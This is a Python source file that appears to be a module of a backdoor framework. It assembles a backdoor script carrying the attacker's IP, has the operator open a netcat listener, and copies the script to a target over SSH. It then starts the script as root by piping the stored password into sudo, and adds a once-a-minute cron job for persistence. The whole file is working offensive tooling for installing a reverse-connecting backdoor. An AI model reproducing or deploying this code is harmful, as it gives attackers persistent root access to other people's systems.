from module import *
import os
import cmd
from colorama import *
from definitions import *

class Pyth(Module):
    prompt = Fore.RED + "(py) " + Fore.BLUE + ">> " + Fore.RESET 
    
    def __init__(self, target, core, ip):
        cmd.Cmd.__init__(self)
        self.intro = GOOD + "Using Python module"
        self.target = target
        self.core = core
	self.localIP = ip
        self.options = {
                "port"   : Option("port", 53922, "port to connect to", True),
                }
    
    def check_valid(self):
        return True
    
    def get_value(self, name):
        if name in self.options:
            return self.options[name].value
        else:
            return None


    def do_exploit(self, args):
        port = self.get_value("port")

        toW = 'pythScript/pythBackdoor.py'
        stringToAdd = ""
        fileToWrite = open(toW, 'w')

	cron = (raw_input(" + Press y to start backdoor as a cronjob (recommended): ") == 'y')

        with open ("pythScript/pythPart1", "r") as myfile:
            data=myfile.read()
        data = data[:-1]#remove the last new line character.
        stringToAdd+=data + self.localIP
    
        with open ("pythScript/pythPart2", "r") as myfile:
            data=myfile.read()
        stringToAdd+=data
        fileToWrite.write(stringToAdd)
        fileToWrite.close()
        raw_input("Run the following command: nc -v -n -l -p %s in another shell." % port)
        self.target.ssh.exec_command('rm pythBackdoor.py')
        self.target.scpFiles(self, 'pythScript/pythBackdoor.py', False)
        print(GOOD + "Moving the backdoor script.")
        if(cron):
            self.target.ssh.exec_command("crontab -l > mycron")
            str = ("* * * * * echo \\\""+ self.target.pword + "\\\" | sudo -S nohup python pythBackdoor.py" )
            #print ("echo \"" + str + "\" >> mycron && crontab mycron && rm mycron")
            self.target.ssh.exec_command("echo \"" + str + "\" >> mycron && crontab mycron && rm mycron")
        #do it in either case to start the backdoor.
	self.target.ssh.exec_command("echo " + self.target.pword + " | sudo -S nohup python pythBackdoor.py")
        print(GOOD + "Python backdoor on %s attempted." % port)


